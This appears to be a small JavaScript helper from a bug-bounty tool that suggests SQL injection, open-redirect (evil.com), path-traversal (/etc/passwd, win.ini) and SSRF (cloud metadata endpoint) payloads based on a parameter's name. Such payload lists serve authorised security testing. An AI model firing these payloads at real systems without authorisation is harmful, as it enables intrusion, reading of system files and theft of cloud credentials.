/**
 * BountyScope Payload Suggestion Engine
 */

export function generatePayloads(parameter) {

  const payloads = [];

  const name = parameter.toLowerCase();

  if (name.includes("id")) {
    payloads.push({
      type: "IDOR",
      payloads: ["1", "2", "999"]
    });

    payloads.push({
      type: "SQL Injection",
      payloads: ["' OR 1=1 --", "' UNION SELECT NULL --"]
    });
  }

  if (name.includes("redirect") || name.includes("url")) {
    payloads.push({
      type: "Open Redirect",
      payloads: [
        "https://evil.com",
        "//evil.com",
        "https://google.com@evil.com"
      ]
    });
  }

  if (name.includes("file") || name.includes("path")) {
    payloads.push({
      type: "Path Traversal",
      payloads: [
        "../../etc/passwd",
        "../../../../windows/win.ini"
      ]
    });
  }

  if (name.includes("url")) {
    payloads.push({
      type: "SSRF",
      payloads: [
        "http://169.254.169.254/latest/meta-data/",
        "http://localhost",
        "http://127.0.0.1"
      ]
    });
  }

  return payloads;
}
